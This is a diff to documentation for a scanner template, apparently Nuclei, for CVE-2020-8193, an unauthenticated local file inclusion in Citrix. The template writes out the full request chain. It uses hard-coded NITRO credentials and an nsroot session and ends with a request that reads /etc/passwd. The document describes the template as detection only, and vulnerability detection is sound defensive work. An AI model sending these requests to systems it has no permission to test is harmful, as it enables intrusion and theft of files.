@@ -212,11 +212,15 @@ requests:
 
 ```yaml
 id: CVE-2020-8193
+
 info:
   name: Citrix unauthenticated LFI
   author: pdteam
   severity: high
+
   # Source:- https://github.com/jas502n/CVE-2020-8193
+  # This template covers only the detection part, use the above exploit for the exploit confirmation.
+
 requests:
   - raw:
       - |
@@ -228,6 +232,7 @@ requests:
         X-NITRO-PASS: xWXHUJ56
 
         <appfwprofile><login></login></appfwprofile>
+
       - |
         GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
         Host: {{Hostname}}
@@ -235,6 +240,7 @@ requests:
         Accept-Encoding: gzip, deflate
         Accept: */*
         Connection: close
+
       - |
         GET /menu/neo HTTP/1.1
         Host: {{Hostname}}
@@ -242,6 +248,7 @@ requests:
         Accept-Encoding: gzip, deflate
         Accept: */*
         Connection: close
+
       - |
         GET /menu/stc HTTP/1.1
         Host: {{Hostname}}
@@ -249,6 +256,7 @@ requests:
         Accept-Encoding: gzip, deflate
         Accept: */*
         Connection: close
+      
       - |
         POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
         Host: {{Hostname}}
@@ -259,9 +267,10 @@ requests:
         Content-Type: application/xml
         X-NITRO-USER: oY39DXzQ
         X-NITRO-PASS: ZuU9Y9c1
-        rand_key: {{rand_key}}
-
+        rand_key: randkey
+ 
         <appfwprofile><login></login></appfwprofile>
+
       - |
         POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
         Host: {{Hostname}}
@@ -272,22 +281,24 @@ requests:
         Content-Type: application/xml
         X-NITRO-USER: oY39DXzQ
         X-NITRO-PASS: ZuU9Y9c1
-        rand_key: {{rand_key}}
+        rand_key: randkey
 
         <clipermission></clipermission>
 
     cookie-reuse: true
 
-   # Using cookie-reuse to maintain session between each request, same as browser. 
+    # Using cookie-reuse to maintain session between each request, same as browser. 
 
     extractors:
       - type: regex
-        name: rand_key
+        name: randkey
         part: body
+        internal: true
         regex:
           - "(?m)[0-9]{3,10}\\.[0-9]+"
 
         # Using rand_key as dynamic variable to make use of extractors at run time. 
+
 
     matchers:
       - type: regex
